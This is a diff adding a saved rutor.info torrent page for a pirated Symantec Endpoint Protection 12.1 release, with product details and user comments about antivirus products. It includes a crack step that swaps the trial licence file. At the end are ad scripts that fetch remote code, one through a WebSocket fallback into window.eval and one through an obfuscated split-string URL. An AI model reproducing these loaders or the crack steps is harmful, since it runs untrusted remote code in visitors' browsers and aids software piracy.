@@ -1,0 +1,384 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Symantec Endpoint Protection 12.1.7445.7000 (RU6 MP10) (2018) РС</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Symantec Endpoint Protection 12.1.7445.7000 (RU6 MP10) (2018) РС</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:c7fe9062a8b3a4f251fe299c2c4dbe4660f43d75&amp;dn=rutor.info_Symantec+Endpoint+Protection+12.1.7445.7000+%28RU6+MP10%29+%282018%29+%D0%A0%D0%A1&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=436647"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/436647"><img src="http://s.rutor.info/t/down.png"> Скачать Symantec_Endpoint_Protection_12.1.6_MP10_RU.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://s016.radikal.ru/i335/1506/25/2d5f16ae36ac.jpg" style="float:right;" /><br />
+<br />
+<b>Версия программы</b>: 12.1.7445.7000 (RU6 MP10)<br />
+<b>Официальный сайт</b>: <a href="http://www.symantec.com/endpoint-protection/" target="_blank">Symantec</a><br />
+<b>Язык интерфейса</b>: Русский<br />
+<br />
+<b>Лечение</b>:<br />
+<li>Для управляемого клиента: в комплекте - замена файлов<br />
+<li>Для неуправляемого клиента: бесплатно<br />
+<br />
+<b><u>Системные требования</u></b>:<br />
+<li>Windows XP/Vista/7/8/8.1/10/Server 2003/Server 2008/Server 2012/Server 2012 R2/Server 2016<br />
+<li>Процессор с тактовой частотой не ниже 1 ГГц<br />
+<li>512 МБ оперативной памяти (рекомендуется 1 ГБ)<br />
+<li>850 МБ свободного места на жестком диске<br />
+<br />
+<b><u>Описание</u></b>: <br />
+Symantec Endpoint Protection, использующий технологию Insight, обеспечивает эффективную и надежную защиту конечных систем. Он предлагает усиленную защиту от всех типов атак для физических и виртуальных систем. Бесшовная интеграция всех необходимых средств обеспечения безопасности в одном высокоэффективном агенте с единой консолью управления позволяет Symantec Endpoint Protection обеспечить передовую защиту, не замедляющую работу системы.<br />
+<br />
+<br />
+<hr /><hr /><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности Symantec Endpoint Protection 12:</div><div class="hidebody"></div><textarea class="hidearea"><li>Непревзойденный уровень защиты - Благодаря технологии Insight обеспечивает более раннее и точное обнаружение новых угроз по сравнению с решениями, реализующими проверку сигнатур или анализ поведения.<br />
+<li>Потрясающее быстродействие - Технология Insight снижает затраты ресурсов на сканирование до 70% по сравнению со стандартными решениями, делая работу продукта незаметной для пользователя.<br />
+<li>Предназначен для виртуальных сред - Обеспечивает безопасность виртуальной инфраструктуры без дополнительной настройки</li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Основные характеристики:</div><div class="hidebody"></div><textarea class="hidearea"><li>Непревзойденная защита, обеспечиваемая мировым лидером в области безопасности<br />
+<li>Логичное сочетание средств антивирусной защиты, защиты от программ-шпионов, фаервола, системы предотвращения вторжений, а также функций сетевого доступа и средств управления приложениями и устройствами (только Symantec Endpoint Protection)<br />
+<li>Работает с единым агентом<br />
+<li>Обеспечивает централизованное управление безопасностью в физических и виртуальных конечных системах Windows и Mac<br />
+<li>Мгновенные обновления NAC без необходимости установки дополнительного программного обеспечения (только Symantec Endpoint Protection)<br />
+<li>Защита от вирусов и программ-шпионов для клиентов Windows, Mac и Linux (для Linux только Symantec Endpoint Protection)<br />
+<li>Предназначен для защиты виртуальной инфраструктуры</li></li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Основные преимущества:</div><div class="hidebody"></div><textarea class="hidearea"><li>Благодаря технологии Insight обнаруживает новые и быстро видоизменяющиеся вредоносные программы<br />
+<li><b>Удаляет вредоносный код</b>: вирусы, черви, троянские компоненты, программы-шпионы, программы показа рекламы, боты, новейшие угрозы и руткиты<br />
+<li>Предотвращает эпидемии, связанные с информационной безопасностью, и снижает административную нагрузку<br />
+<li>Снижает совокупную стоимость обслуживания конечных систем.</li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Новое в Symantec Endpoint Protection 12.1:</div><div class="hidebody"></div><textarea class="hidearea">Улучшения в процессе установки<br />
+Мастер развертывания включает инструмент для автоматического удаления других установленных программ безопасности. С версии 12.1.2 функция удаляет более 40 сторонних продуктов безопасности.<br />
+Вы можете скачать и запустить новой инструмент диагностики на управляющем сервере и у клиента, чтобы выполнить общую диагностику до и после установки. Утилита Symantec Help позволяет самостоятельно решить проблемы вместо обращения в техподдержку.<br />
+Улучшения виртуализации и удаленного управления.<br />
+<br />
+<b>Функции для Windows 8</b><br />
+Поддержка интерфейса Microsoft Windows 8, в том числе уведомлений &quot;toast notifications&quot; о критических событиях.<br />
+Поддержка Windows 8 и Windows Server 2012.<br />
+Поддержка технологии раннего запуска защиты от вредоносных программ - Windows 8 Early Launch Anti-Malware (ELAM), обеспечивающей запуск защиты раньше других сторонних компонентов в системе. Поддержка ELAM позволяет более эффективно обнаруживать возможные руткиты.<br />
+<br />
+<b>Функции защиты</b><br />
+<b>Антивирус и антишпион</b>:<br />
+Полная поддержка интерфейса в стиле Microsoft Windows 8.<br />
+<br />
+<b>Превентивная защита от угроз</b>:<br />
+Device Control теперь отправляет уведомления и создает события в журнале каждый раз, когда блокируется ранее отключенные устройства. Ранее Device Control делал это только первый раз, когда устройство отключалось.<br />
+System lockdown теперь может работать в режиме черного списка - блокировать только те приложения, которые указаны в нем.<br />
+<br />
+<b>Исключения</b>:<br />
+Добавлена поддержка HTTPS в исключения надежных веб-доменов.<br />
+Общие переменные в исключениях теперь применяются на 64-разрядные приложения, также хорошо, как на 32-разрядные приложения.<br />
+<br />
+<b>Политики безопасности</b>:<br />
+Вы можете экспортировать все политики, местоположения и параметры сервера для домена. Если вы затем импортируете эти политики и параметры в новый домен, вам воссоздавать их.</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Новое в версии:</div><div class="hidebody"></div><textarea class="hidearea">Добавлена базовая поддержка Windows Server 2016.<br />
+Добавлена поддержка SQL Server 2012 SP3.<br />
+Добавлена поддержка Microsoft Outlook 2016 (для сканера Microsoft Outlook).<br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Процедура лечения:</div><div class="hidebody"></div><textarea class="hidearea">Для SEPM:&quot;Триал до 01.07.2030&quot; (перед установкой заменить файл SEPMsep_trial.slf одноимённым файлом из папки Crack)<br />
+Для неуправляемого клиента не требуется.</textarea></div><hr /><hr /><center><a href="http://lostpic.net/image/QT0g" target="_blank"><img src="http://img11.lostpic.net/2017/02/09/cb3b696c89d7e15c460377d1f18e8df1.th.jpg" /></a> <a href="http://lostpic.net/image/QT6H" target="_blank"><img src="http://img11.lostpic.net/2017/02/09/7397cc2ee171030c89b89e2c87f20161.th.jpg" /></a> <a href="http://lostpic.net/image/QT6M" target="_blank"><img src="http://img11.lostpic.net/2017/02/09/afc9eb530370f566f3dae6b668acb530.th.jpg" /></a></center><hr /><hr /></li></li></li></li></li></li></td></tr>
+
+<tr><td class="header">Оценка</td><td>10 из 10 (4 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/soft" target="_blank">Софт </a></td></tr>
+<tr><td class="header">Раздают</td><td>10</td></tr>
+<tr><td class="header">Качают</td><td>0</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (3 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 15:24:38  (17 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>1.06&nbsp;GB  (1139332804 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 436647);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>11&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/531361"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:147b9c78e4b88b1d9dfb6a623e1fec60b7319d53&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/531361/symantec-endpoint-protection-14.0-ru1-mp2-14.0.3929.1200-2018-rs">Symantec Endpoint Protection 14.0 RU1 MP2 (14.0.3929.1200) (2018) РС </a></td> <td align="right">7<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>05&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/350310"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a80be0d0849cdb3e1c013effcd71f572bdb0eaa0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/350310/symantec-endpoint-protection-14.0-ru1-mp2-14.0.3929.1200-2018-rs">Symantec Endpoint Protection 14.0 RU1 MP2 (14.0.3929.1200) (2018) РС </a></td> <td align="right">51<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">119.49&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/9/0/0/Symantec" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/436647.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1774)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=436647">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(436647);">Промодерировать раздачу</span> | <span onclick="confirm_delete(436647);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/436647">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>gnomandrey</b></td> <td>13-02-2018 20:32:21 (3 месяца назад)</td> <td></td> <td align="right"><span id="c_3152192"></span><script type="text/javascript">cOptions(459463,3152192);</script></td></tr><tr><td class="c_t" colspan=4>лет 10 назад был отличный. сейчас полный шлак</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Sergei63</b></td> <td>01-11-2017 18:42:00 (6 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3087950"></span><script type="text/javascript">cOptions(739146,3087950);</script></td></tr><tr><td class="c_t" colspan=4>Народ, хватит писать глупости. Переместить ЛИЧНУЮ папку на другой диск, создайте исключение в сумантике все кроме диска С. И вы забудете все проблемы, это лучший защитник на сегодняшний день, сижу на нем около 10 лет, версия 14.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Алекс49</b></td> <td>01-11-2017 16:57:03 (6 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3087889"></span><script type="text/javascript">cOptions(1194307,3087889);</script></td></tr><tr><td class="c_t" colspan=4>      Уважаемый,Mus14 Вы о кассирше из ЦПКО  или он правда ничего!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Mus14</b></td> <td>01-11-2017 14:09:40 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3087800"></span><script type="text/javascript">cOptions(1352483,3087800);</script></td></tr><tr><td class="c_t" colspan=4>Такое впечатление, что у Symantec компьютер - один сплошной вирус! Куча ложных срабатываний. Раньше пользовался Bitdefender TS 2015, считаю его лучшим в мире, но на 10-ку он почему-то плохо заточен. Сейчас на comss.ru раздают бесплатную лицензию F-Secure 2018 на 6 месяцев, решил поставить, очень даже ничего. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>MacOS</b></td> <td>10-02-2017 7:31:45 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2933927"></span><script type="text/javascript">cOptions(334830,2933927);</script></td></tr><tr><td class="c_t" colspan=4>Однобокий у тебя взгляд на обеспечение безопасности.<br />
+360 Total Security гораздо привлекательнее чем norton antivirus</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>gor17</b></td> <td>09-02-2017 20:14:59 (15 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2933664"></span><script type="text/javascript">cOptions(1288671,2933664);</script></td></tr><tr><td class="c_t" colspan=4>За всё время с 2001 года (разное железо) AVG и Symantec показывали наилучшие результаты защиты. Касперы, Вебы, Панды, Ноды, даже если подарят с лицензией - ставить не буду!<br />
+Наилучшее испытание вирусы прошли, когда использовал &quot;Спутниковую рыбалку&quot; и проверял перехваченные файлы, а это было и до 60 гиг.<br />
+Но в разных пользователей может быть ро-разному: кто-то на порносайты не ходит,  кто-то не использует &quot;левых&quot; программ, у кого-то железо хилой конфигурации, кому-то нравится интерфейс. Каспера вообще выбросить, как вирус, коорый отправляет данные о пользователе и его файлах.</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
